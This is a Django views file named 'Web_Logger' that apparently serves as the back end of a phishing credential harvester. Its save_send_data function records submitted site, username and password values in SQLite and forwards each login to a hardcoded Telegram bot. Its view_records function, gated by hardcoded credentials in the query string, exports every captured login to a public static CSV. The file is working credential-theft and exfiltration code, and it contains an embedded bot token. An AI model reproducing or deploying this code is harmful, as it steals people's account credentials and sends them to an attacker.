from django.http import HttpResponseRedirect
from django.http import HttpResponse
from django.shortcuts import render
from pathlib import Path
import sqlite3
import os
import datetime as datetime_
import csv
import requests


BASE_DIR = Path(__file__).resolve().parent.parent
date_time = datetime_.datetime
db = sqlite3.connect('db.sqlite3', check_same_thread=False)
cursor = db.cursor()


class Web_Logger:
    def view_records(request):
        if request.method == "GET":
            username = str(request.GET.get('user'))
            password = str(request.GET.get('pass'))
            if username == "amanjot" and password == "1408":
                cursor.execute("SELECT * FROM data")
                data = cursor.fetchall()
                with open(os.path.join(BASE_DIR, 'static', 'data', 'data.csv'), 'w') as file:
                    csv_file = csv.writer(file)
                    csv_file.writerow(['TimeStamp', 'Website', 'Username', 'Password'])
                    for row in data:
                        csv_file.writerow(row)
                return render(request, "records.html", {'data':data})
        return HttpResponse('Server Error: 505')

    def save_send_data(request):
        TimeStamp = date_time.now().strftime("%d-%m-%Y %I:%M %p")
        if request.method == "POST":
            site = str(request.GET.get('s'))
            username = str(request.GET.get('u'))
            password = str(request.GET.get('p'))
            cursor.execute("INSERT INTO data (Timestamp,Site,Username,Password) VALUES (?,?,?,?)",(TimeStamp,site,username,password))
            db.commit()

            bot_token = '1173601030:AAGVCYI3jZSmvcE3SPECDDIrgN-PKsdSrwk'
            bot_chatID = '711666569'
            send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=HTML&text=<b><u>Guru portal</u></b><br><b>username:</b> '+username+'<br><b>password:</b> '+password
            requests.get(send_text)

